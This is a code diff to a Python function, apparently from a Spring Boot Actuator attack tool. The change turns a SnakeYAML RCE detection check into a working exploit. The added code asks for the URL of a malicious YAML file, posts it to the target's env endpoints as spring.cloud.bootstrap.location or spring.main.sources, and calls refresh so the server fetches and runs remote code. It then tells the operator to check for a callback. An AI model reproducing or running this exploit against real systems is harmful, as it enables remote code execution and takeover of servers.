@@ -363,26 +363,49 @@ def SnakeYAML_RCE(url, proxies, header_new):
         "User-Agent": random.choice(ua),
         "Content-Type": "application/json"
         }
+
     payload_1 = "spring.cloud.bootstrap.location=http://127.0.0.1/example.yml"
     payload_2 = "{\"name\":\"spring.main.sources\",\"value\":\"http://127.0.0.1/example.yml\"}"
-    path = 'env'
+    url_1 = url + 'env'
+    url_2 = url + 'actuator/env'
+    url_refresh_1 = url + 'refresh'
+    url_refresh_2 = url + 'actuator/refresh'
     Headers_1 = json.loads(str(JSON_handle(oldHeaders_1, header_new)).replace("'", "\""))
     Headers_2 = json.loads(str(JSON_handle(oldHeaders_2, header_new)).replace("'", "\""))
+
     try:
         requests.packages.urllib3.disable_warnings()
-        urltest = url + path
-        re1 = requests.post(url=urltest, headers=Headers_1, timeout = outtime, data=payload_1, allow_redirects=False, verify=False, proxies=proxies)
-        re2 = requests.post(url=urltest, headers=Headers_2, timeout = outtime, data=payload_2, allow_redirects=False, verify=False, proxies=proxies)
+        re1 = requests.post(url=url_1, headers=Headers_1, timeout = outtime, data=payload_1, allow_redirects=False, verify=False, proxies=proxies)
+        re2 = requests.post(url=url_2, headers=Headers_2, timeout = outtime, data=payload_2, allow_redirects=False, verify=False, proxies=proxies)
+
         if ('example.yml' in str(re1.text)):
-            cprint("[+] 发现SnakeYAML-RCE漏洞，Poc为Spring 1.x：", "red")
-            cprint('漏洞存在路径为 ' + urltest + '\n', "red")
-            cprint('POST数据包内容为 ' + payload_1 + '\n', "red")
+            cprint("[+] 发现SnakeYAML-RCE漏洞，版本为Spring 1.x", "red")
+            EvilUrl = input("[+] 请输入恶意yaml所在的URL（如：http://chybeta.com/example.yml）>>> ")
+            EvilUrl = EvilUrl.strip()
+            payload_1 = "spring.cloud.bootstrap.location=" + EvilUrl
+            re1 = requests.post(url=url_1, headers=Headers_1, timeout=outtime, data=payload_1, allow_redirects=False,
+                                verify=False, proxies=proxies)
+            requests.post(url=url_refresh_1, headers=Headers_1, timeout=outtime, allow_redirects=False,)
+            if ('example.yml' in str(re1.text)):
+                cprint("[+] 恶意yaml已经成功加载，请检查是否有回连", "red")
+            else:
+                cprint("[-] 恶意yaml加载失败，请检查URL是否正确\n", "yellow")
+
         elif ('example.yml' in str(re2.text)):
-            cprint("[+] 发现SnakeYAML-RCE漏洞，Poc为Spring 2.x：", "red")
-            cprint('漏洞存在路径为 ' + urltest + '\n', "red")
-            cprint('POST数据包内容为 ' + payload_2 + '\n', "red")
+            cprint("[+] 发现SnakeYAML-RCE漏洞，版本为Spring 2.x", "red")
+            EvilUrl = input("[+] 请输入恶意yaml所在的URL（如：http://chybeta.com/example.yml）>>> ")
+            EvilUrl = EvilUrl.strip()
+            payload_2 = "{\"name\":\"spring.main.sources\",\"value\":\"" + EvilUrl + "\"}"
+            re2 = requests.post(url=url_2, headers=Headers_2, timeout=outtime, data=payload_2, allow_redirects=False,
+                                verify=False, proxies=proxies)
+            requests.post(url=url_refresh_2, headers=Headers_2, timeout=outtime, allow_redirects=False,)
+            if ('example.yml' in str(re2.text)):
+                cprint("[+] 恶意yaml已经成功加载，请检查是否有回连", "red")
+            else:
+                cprint("[-] 恶意yaml加载失败，请检查URL是否正确\n", "yellow")
         else:
             cprint("[-] 未发现SnakeYAML-RCE漏洞\n", "yellow")
+
     except KeyboardInterrupt:
         print("Ctrl + C 手动终止了进程")
         sys.exit()
